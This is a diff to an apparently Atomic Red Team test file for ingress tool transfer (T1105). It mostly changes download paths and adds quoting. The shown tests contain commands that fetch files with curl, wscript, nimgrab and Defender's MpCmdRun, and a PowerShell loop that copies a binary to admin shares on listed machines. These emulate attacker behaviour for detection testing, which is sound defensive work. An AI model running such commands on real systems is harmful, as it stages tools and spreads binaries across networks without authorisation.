@@ -344,7 +344,7 @@ atomic_tests:
   - description: 'Must have a Windows Defender version with MpCmdRun.exe installed'
     prereq_command: |
       cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
-      MpCmdRun.exe /?
+      MpCmdRun.exe /?  >nul 2>&1
     get_prereq_command: Echo "A version of Windows Defender with MpCmdRun.exe must be installed manually"
   executor:
     command: |
@@ -484,11 +484,11 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{curl_path}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile $env:temp\curl.zip
-      Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
-      Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
-      Remove-Item $env:temp\curl
-      Remove-Item $env:temp\curl.zip
+      Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
   executor:
     command: |
       #{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll
@@ -529,11 +529,11 @@ atomic_tests:
     prereq_command: |
       if (Test-Path #{curl_path}) {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest “https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip” -Outfile $env:temp\curl.zip
-      Expand-Archive -Path $env:temp\curl.zip -DestinationPath $env:temp\curl
-      Copy-Item $env:temp\curl\curl-7.79.1-win64-mingw\bin\curl.exe C:\Windows\System32\Curl.exe
-      Remove-Item $env:temp\curl
-      Remove-Item $env:temp\curl.zip
+      Invoke-WebRequest "https://curl.se/windows/dl-7.79.1/curl-7.79.1-win64-mingw.zip" -Outfile PathToAtomicsFolder\..\ExternalPayloads\curl.zip
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\curl.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\curl\curl-7.79.1-win64-mingw\bin\curl.exe" C:\Windows\System32\Curl.exe
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl"
+      Remove-Item "PathToAtomicsFolder\..\ExternalPayloads\curl.zip"
   - description: |
       A file must be created to upload
     prereq_command: |
@@ -571,13 +571,13 @@ atomic_tests:
   - description: |
       #{Path_to_file} must exist on system.
     prereq_command: |
-      if (Test-Path #{Path_to_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{Path_to_file}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{Path_to_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{Path_to_file}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.bat" -OutFile "#{Path_to_file}"
   executor:
     command: |
-      #{Path_to_file} 1>NUL 
+      "#{Path_to_file}" 1>NUL 
     cleanup_command: |
       del /f/s/q %temp%\T1105 >nul 2>&1
       rmdir /s/q %temp%\T1105 >nul 2>&1
@@ -613,17 +613,18 @@ atomic_tests:
     get_prereq_command: |
       write-host "The binary_file input parameter must be set to a binary that exists on this computer."
   - description: |
-      Machine list must exist at specified location ("$env:temp\T1105MachineList.txt")
+      Machine list must exist at specified location ("PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt")
     prereq_command: |
-      if (Test-Path "$env:temp\T1105MachineList.txt") {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt") {exit 0} else {exit 1}
     get_prereq_command: |
-      new-item -path "$env:temp\T1105MachineList.txt"
-      echo "A machine list file has been generated at "$env:temp\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      new-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt" | Out-Null
+      echo "A machine list file has been generated at "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt". Please enter the machines to target there, one machine per line."
   executor:
     command: |
-      $machine_list = "$env:temp\T1105MachineList.txt"
-      $offline_list = "$env:temp\T1105OfflineHosts.txt"
-      $completed_list = "$env:temp\T1105CompletedHosts.txt"
+      $machine_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105MachineList.txt"
+      $offline_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt"
+      $completed_list = "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt"
       foreach ($machine in get-content -path "$machine_list")
       {if (test-connection -Count 1 -computername $machine -quiet) 
       {cmd /c copy "#{binary_file}" "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}"
@@ -632,12 +633,12 @@ atomic_tests:
       else
       {echo $machine >> "$offline_list"}}
     cleanup_command: |
-      if (test-path "$env:temp\T1105CompletedHosts.txt") 
-      {foreach ($machine in get-content -path "$env:temp\T1105CompletedHosts.txt")
+      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt") 
+      {foreach ($machine in get-content -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt")
       {wmic /node: "$machine" process where name='"regsvr32.exe"' call terminate | out-null
       Remove-Item -path "\\$machine\#{remote_drive_letter}$#{exe_remote_folder}" -force -erroraction silentlycontinue}}
-      Remove-Item -path "$env:temp\T1105OfflineHosts.txt" -erroraction silentlycontinue
-      Remove-item -path "$env:temp\T1105CompletedHosts.txt" -erroraction silentlycontinue
+      Remove-Item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105OfflineHosts.txt" -erroraction silentlycontinue
+      Remove-item -path "PathToAtomicsFolder\..\ExternalPayloads\T1105CompletedHosts.txt" -erroraction silentlycontinue
     name: powershell
 
 - name: Printer Migration Command-Line Tool UNC share folder into a zip file
@@ -684,14 +685,14 @@ atomic_tests:
   - description: |
       #{replace_cab} must exist on system.
     prereq_command: |
-      if (Test-Path #{replace_cab}) {exit 0} else {exit 1}
+      if (Test-Path "#{replace_cab}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{replace_cab}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{replace_cab}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/redcanary.cab" -OutFile "#{replace_cab}"
   executor:
     command: |
       del %TEMP%\redcanary.cab >nul 2>&1
-      #{Path_replace} #{replace_cab} %TEMP% /A
+      #{Path_replace} "#{replace_cab}" %TEMP% /A
     cleanup_command: |
       del %TEMP%\redcanary.cab >nul 2>&1
     name: command_prompt
@@ -754,12 +755,13 @@ atomic_tests:
   - description: |
       #{vbscript_file} must be exist on system.
     prereq_command: |
-      if (Test-Path #{vbscript_file}) {exit 0} else {exit 1}
+      if (Test-Path "#{vbscript_file}") {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory (split-path #{vbscript_file}) -ErrorAction ignore | Out-Null
+      New-Item -Type Directory (split-path "#{vbscript_file}") -ErrorAction ignore | Out-Null
       Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105-download-file.vbs" -OutFile "#{vbscript_file}"
   executor:
-    command: 'wscript.exe #{vbscript_file}'
+    command: |
+      wscript.exe "#{vbscript_file}"
     cleanup_command: del Atomic-License.txt >nul 2>&1
     name: command_prompt
 - name: Linux Download File and Run
@@ -798,13 +800,9 @@ atomic_tests:
       description: Destination path to file
       type: path
       default: $env:TEMP\Atomic-license.txt
-    local_nimgrab:
-      description: Local path to nimgrab
-      type: path
-      default: $env:TEMP\nimgrab.exe
   executor:
     command: |
-      cmd /c nimgrab.exe #{remote_file} #{destination_path}
+      cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" #{remote_file} #{destination_path}
     cleanup_command: |
       del #{destination_path} >nul 2>&1
     name: command_prompt
@@ -813,13 +811,12 @@ atomic_tests:
   - description: |
       NimGrab must be installed on system.
     prereq_command: |
-      if (Test-Path "#{local_nimgrab}") {exit 0} else {exit 1}
+      if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe") {exit 0} else {exit 1}
     get_prereq_command: |
-      Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile $env:temp\nim.zip
-      Expand-Archive -Path $env:temp\nim.zip -DestinationPath $env:temp\nim -Force
-      Copy-Item $env:temp\nim\nim-1.6.6\bin\nimgrab.exe #{local_nimgrab}
-      Remove-Item $env:temp\nim
-      Remove-Item $env:temp\nim.zip
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+      Invoke-WebRequest "https://nim-lang.org/download/nim-1.6.6_x64.zip" -Outfile "PathToAtomicsFolder\..\ExternalPayloads\nim.zip"
+      Expand-Archive -Path "PathToAtomicsFolder\..\ExternalPayloads\nim.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\nim" -Force
+      Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\nim\nim-1.6.6\bin\nimgrab.exe" "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe"
 - name: iwr or Invoke Web-Request download
   auto_generated_guid: c01cad7f-7a4c-49df-985e-b190dcf6a279
   description: |
